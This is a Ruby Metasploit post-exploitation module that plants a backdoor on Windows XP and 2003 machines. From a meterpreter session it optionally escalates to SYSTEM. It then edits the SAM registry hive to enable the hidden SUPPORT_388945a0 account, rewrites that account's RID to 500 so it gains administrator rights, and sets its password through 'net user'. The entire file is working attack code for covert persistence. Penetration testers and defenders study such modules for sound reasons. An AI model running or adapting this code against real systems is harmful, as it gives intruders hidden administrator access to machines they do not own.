require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Registry
	include Msf::Post::Windows::Priv

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage Trojanize Support Account',
			'Description'   => %q{
				This module enables alternative access to servers and workstations
				by modifying the support account's properties. It will enable
				the account for remote access as the administrator user while
				taking advantage of some weird behavior in lusrmgr.msc. It will
				check if sufficient privileges are available for registry operations,
				otherwise it exits.
			},
			'License'       => MSF_LICENSE,
			'Author'        => 'salcho <salchoman[at]gmail.com>',
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'References'	=> [ 'http://xangosec.blogspot.com/2013/06/trojanizing-windows.html' ]
		))

		register_options(
		[
			OptString.new('PASSWORD',  [true, 'Password of the support user account', 'password']),
			OptBool.new('GETSYSTEM',   [true,  'Attempt to get SYSTEM privilege on the target host.', false])
		], self.class)
	end

	def run
		reg_key = 'HKLM\\SAM\\SAM\\Domains\\Account\\Users'

		unless (is_system?())
			if (datastore['GETSYSTEM'])
				print_status("Trying to get system...")
				res = session.priv.getsystem
				unless res[0]
					print_error("Unable to get system! You need to run this script.")
					return
				else
					print_good("Got system!")
				end
			else
				print_error("You need to run this script as system!")
				return
			end
		end

		wver = sysinfo()["OS"]
		if wver !~ /Windows XP|Windows .NET|Windows 2003/
			print_error("#{wver} is not supported")
			return
		end

		print_status("Target OS is #{wver}")
		names_key = registry_enumkeys(reg_key + '\\Names')
		unless names_key
			print_error("Couldn't access registry keys")
			return
		end

		rid = -1
		print_status('Harvesting users...')
		names_key.each do |name|
			if name.include?'SUPPORT_388945a0'
				print_good("Found #{name} account!")
				skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
				if not skey
					print_error("Couldn't open user's key")
					return
				end
				rid = skey['Type']
				print_status("Target RID is #{rid}")
			end
		end

		if rid == -1
			print_error("Couldn't get user's RID...")
			return
		end

		users_key = registry_enumkeys(reg_key)
		users_key.each do |r|
			next if r.to_i(16) != rid

			f = registry_getvaldata(reg_key + "\\#{r}", "F")
			if check_active(f)
				print_status("Account is disabled, activating...")
				f[0x38] = ["10"].pack("H")
			else
				print_error("Target account is already enabled")
			end

			print_status("Swapping RIDs...!")
			# Overwrite RID to 500 (as administrator)
			f = swap_rid(f, 500)

			open_key = registry_setvaldata(reg_key + "\\#{r}", "F", f, "REG_BINARY")
			unless open_key
				print_error("Can't write to registry... Something's wrong!")
				return
			end

			print_status("Setting password to #{datastore['PASSWORD']}")
			cmd = cmd_exec('cmd.exe', "/c net user support_388945a0 #{datastore['PASSWORD']}")
			vprint_status("#{cmd}")
		end
	end

	def check_active(f)
		if f[0x38].unpack("H*")[0].to_i == 11
			return true
		else
			return false
		end
	end

	def swap_rid(f, rid)
		# This function will set hex format to a given RID integer
		hex = [("%04x" % rid).scan(/.{2}/).reverse.join].pack("H*")
		# Overwrite new RID at offset 0x30
		f[0x30, 2] = hex
		return f
	end
end
